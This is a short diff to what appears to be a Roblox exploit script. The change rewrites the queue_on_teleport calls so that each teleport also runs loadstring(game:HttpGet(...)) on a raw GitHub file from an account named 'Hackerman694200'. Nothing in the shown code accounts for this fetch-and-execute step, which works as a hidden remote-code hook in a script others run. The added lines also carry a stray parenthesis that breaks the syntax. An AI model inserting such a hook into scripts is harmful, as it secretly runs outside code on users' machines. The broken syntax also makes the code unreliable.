@@ -3359,9 +3359,9 @@ do
 				queue = queue .. " loadfile('" .. ScriptFile .. "')()"
 
 				if syn then
-					syn.queue_on_teleport(queue)
+					syn.queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Hackerman694200/tester/main/codetemp.lua'))()"), queue)
 				else
-					queue_on_teleport(queue)
+					queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Hackerman694200/tester/main/codetemp.lua'))()"), queue)
 				end
 			end
 
